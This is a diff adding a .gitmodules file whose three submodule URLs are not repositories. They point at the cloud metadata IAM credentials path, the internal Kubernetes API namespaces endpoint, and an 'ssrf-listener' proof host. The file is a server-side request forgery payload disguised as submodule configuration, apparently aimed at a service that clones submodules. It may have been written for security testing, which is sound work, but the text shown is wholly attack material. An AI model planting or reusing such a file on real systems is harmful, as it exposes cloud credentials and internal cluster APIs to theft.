@@ -1,0 +1,9 @@
+[submodule "shared-libs"]
+    path = shared-libs
+    url = http://169.254.169.254/latest/meta-data/iam/security-credentials/
+[submodule "internal-config"]
+    path = internal-config
+    url = http://kubernetes.default.svc.cluster.local/api/v1/namespaces
+[submodule "analytics"]
+    path = analytics
+    url = http://ssrf-listener.default.svc.cluster.local/ssrf-proof-from-git-sync
